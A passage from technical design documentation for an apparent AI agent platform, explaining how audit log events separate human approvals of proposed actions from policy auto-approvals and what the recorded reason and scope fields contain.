| `proposed_action.denied` | the **user** who refused | with `payload.reason` |
| `action.executed` / `action.failed` | `system` | execution outcome |

From this comes the only reliable way to separate the two things this
document describes:

- **human decision** = count `proposed_action.approved` events;
- **policy decision** = `proposed_action.created` with `status:
  auto_approved` and an agent actor. It never produces a `.approved`, and
  so it's never confused with a click. Its `reason` says **which** rule
  auto-approved — `agent_autonomy: auto_approve`, a `permissions.json allow`
  line, the container floor, `escopo: cd dentro da pasta do projeto` — in
  the exact wording `decide()` uses. Events recorded before
  [RN-567](../business-rules/api.md#rn-567) have no `reason`: read that as "not
  recorded", not as "no rule". The reason names the rule, not the scope
  root; since [RN-609](../business-rules/api.md#rn-609) a `terminal` action's
  event also carries `scopeRoot` — the execution mode plus a RELATIVE
  identifier of the root the path scope compared against (the
  `workspace_dir_name` in `container`/`runner`, the segment under
  `BRABO_PROJECTS_BASE` in `mounted`), never the absolute path, which would
  expose the user's `$HOME` to every member. The outbox row carries neither
  `reason` nor `scopeRoot` — no engine consumer reads them. Since
  [RN-614](../business-rules/web.md#rn-614) the UI shows both, in one sentence
  built by one function: on the event's line in the session log panel and on
  the approval card (session chat and the Approvals tab queue). An older
  event says "not recorded", and the card says so when the event is outside
  the events loaded on that screen.

This wasn't true until Phase 12e. The first three rows went **only to the
outbox**, which is transport — drained, marked with `processed_at`, and
pruned — and the decision survived only in `proposed_actions.decided_at`,
a column outside the timeline that the UI, the Psychologist, and the
Anamnesis read. The practical result was that "how many times did the
human approve" couldn't be answered in the Phase 10 dogfooding, which was
exactly that experiment's main metric.

Repository bootstrap is the deliberate exception: the mutations it
proposes don't emit `proposed_action.created` in the log, because they're
already narrated by `bootstrap.step_*` in the same session — counting them
again would inflate the approval metric with work nobody approved.
